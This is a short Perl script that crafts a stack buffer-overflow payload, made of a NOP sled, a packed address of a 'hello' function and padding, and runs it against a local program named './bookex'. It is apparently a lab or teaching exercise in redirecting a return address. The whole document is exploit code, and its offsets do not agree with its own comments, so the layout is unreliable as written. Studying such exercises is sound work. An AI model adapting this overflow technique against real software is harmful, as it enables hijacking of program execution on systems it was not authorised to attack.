#!/usr/bin/perl

# Craft a payload to overwrite the return address
# Assuming the return address is 24 bytes below the frame pointer

# Address to the hello function
my $hello_address = pack('V', 0x1189);  # Replace with the actual address

# NOP sled (No-Operation instructions for padding)
my $nop_sled = "\x90" x 16;

# Fill the buffer with NOP sled, address to hello, and padding
my $payload = $nop_sled . $hello_address . "C" x (24 - length($nop_sled) - length($hello_address));

# Craft the input with the payload to overflow the buffer
my $input = "A" x 24 . $payload;

# Execute the vulnerable program with the crafted input
system("./bookex", $input);

